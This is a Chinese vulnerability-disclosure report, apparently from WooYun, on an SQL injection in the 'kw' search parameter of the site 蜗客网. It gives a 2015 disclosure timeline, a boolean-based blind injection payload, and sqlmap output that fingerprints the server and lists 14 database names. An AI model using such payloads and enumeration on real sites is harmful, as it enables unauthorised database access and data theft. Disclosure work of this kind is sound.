wybug_title: 蜗客网主站SQL注入漏洞一枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-10-31：	细节已通知厂商并且等待厂商处理中									2015-11-04：	厂商已经确认，细节仅向厂商公开									2015-11-14：	细节向核心白帽子及相关领域专家公开									2015-11-24：	细节向普通白帽子公开									2015-12-04：	细节向实习白帽子公开									2015-12-19：	细节向公众公开  简要描述： 蜗客网SQL注入 详细说明：  .
**.**.**.**
   漏洞证明：  
http://**.**.**.**/list-all/?kw=1&ob=1

sqlmap resumed the following injection point(s) from stored session:---Parameter: kw (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: kw=1%' AND 8707=8707 AND '%'='&ob=1---[20:29:08] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[20:29:08] [INFO] fetching database names[20:29:08] [INFO] fetching number of databases[20:29:09] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[20:29:09] [INFO] retrieved:[20:29:09] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[20:29:09] [ERROR] unable to retrieve the number of databases[20:29:09] [INFO] resumed: db_wokew[20:29:09] [INFO] resumed: master[20:29:09] [INFO] resumed: tempdb[20:29:09] [INFO] resumed: model[20:29:09] [INFO] resumed: msdb[20:29:09] [INFO] resumed: ReportServer[20:29:09] [INFO] resumed: ReportServerTempDB[20:29:09] [INFO] resumed: AdventureWorksDW[20:29:09] [INFO] resumed: AdventureWorks[20:29:09] [INFO] resumed: db_wokew[20:29:09] [INFO] resumed: db_wokew_dbas[20:29:09] [INFO] resumed: db_wokew_finance[20:29:09] [INFO] resumed: db_wokew_tempdata[20:29:09] [INFO] resumed: db_wokew_logs[20:29:09] [INFO] resumed: db_wokew_reptile[20:29:09] [INFO] resumed:available databases [14]:[*] AdventureWorks[*] AdventureWorksDW[*] db_wokew[*] db_wokew_dbas[*] db_wokew_finance[*] db_wokew_logs[*] db_wokew_reptile[*] db_wokew_tempdata[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-11-04 15:06 厂商回复： 暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无
